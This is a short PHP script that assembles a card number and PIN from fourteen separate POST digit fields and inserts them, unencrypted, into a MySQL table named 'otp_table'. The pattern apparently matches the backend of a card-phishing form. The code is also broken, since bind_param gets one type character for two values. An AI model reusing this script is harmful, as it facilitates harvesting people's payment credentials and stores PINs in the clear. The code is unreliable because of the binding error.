<?php
$host = "your_database_host";
$username = "your_database_username";
$password = "your_database_password";
$database = "your_database_name";

$conn = new mysqli($host, $username, $password, $database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$cardNumber = $_POST['digit1'] . $_POST['digit2'] . $_POST['digit3'] . $_POST['digit4'] . $_POST['digit5'] . $_POST['digit6'].$_POST['digit7'].$_POST['digit8'];
$pin = $_POST['digit9'].$_POST['digit10'].$_POST['digit11'].$_POST['digit12'].$_POST['digit13'].$_POST['digit14'];

if (storeOTPInDatabase($conn, $cardNumber, $pin)) {
    echo "stored successfully in the database.";
} else {
    echo "Error storing in the database.";
}

function storeOTPInDatabase($conn, $cardNumber, $pin) {
    $sql = "INSERT INTO otp_table (cardNumber, pin) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $cardNumber, $pin);

    $result = $stmt->execute();

    $stmt->close();

    return $result;
}

$conn->close();
?>
